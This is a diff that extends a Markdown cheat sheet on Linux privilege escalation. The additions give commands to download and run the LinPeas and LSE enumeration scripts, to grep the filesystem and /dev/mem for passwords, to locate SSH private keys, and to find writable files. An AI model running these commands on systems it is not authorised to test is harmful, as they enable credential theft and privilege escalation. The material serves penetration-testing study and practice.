@@ -1,9 +1,39 @@
 # Linux Privilege Escalation
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#find-sensitive-files
 
 ## PrivEsc Enumerations Scripts
+### LinPeas
 ```bash
+# Download without git
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
+curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
+
+# Execution
+./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
+./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
+./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
+```
+
+### LinuxSmartEnumeration
+```bash
+# Download without git
+wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
+curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
+
+# Execution
+./lse.sh -l1 # shows interesting information that should help you to privesc
+./lse.sh -l2 # dump all the information it gathers about the system
+
 
 ```
+
+### LinEnum
+```bash
+./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
+```
+
+### SudoKiller
+TBA
 
 ## Operating System
 ```bash
@@ -96,20 +126,39 @@ crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
 ls -al /etc/cron*
-cat /etc/cron*
-cat /etc/at.allow
-cat /etc/at.deny
-cat /etc/cron.allow
-cat /etc/cron.deny
-cat /etc/crontab
-cat /etc/anacrontab
-cat /var/spool/cron/crontabs/root
+
+/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/anacrontab
+/var/spool/cron
+/var/spool/cron/crontabs/root
+
+# You Can Use .pspy to detect a CRON job
+/pspy64 -pf -i 1000 
+
+# Systemd timers
+systemctl list-timers --all
 
 # Plain-text usernames and passwords
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 grep -i user [filename]
 grep -i pass [filename]
 grep -C 5 "password" [filename]
 find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
+
+# In Memory Password
+strings /dev/mem -n10 | grep -i PASS
 
 ```
 
@@ -208,6 +257,9 @@ cat /etc/aliases
 getent aliases
 
 # Accessable Private Keys
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+
 cat ~/.ssh/authorized_keys
 cat ~/.ssh/identity.pub
 cat ~/.ssh/identity
@@ -235,6 +287,10 @@ ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other
 
 find /etc/ -readable -type f 2>/dev/null                         # Anyone
 find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+
+find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find / -perm -2 -type f 2>/dev/null
+find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
 
 # Hidden Files on Website
 ls -alhR /var/www/
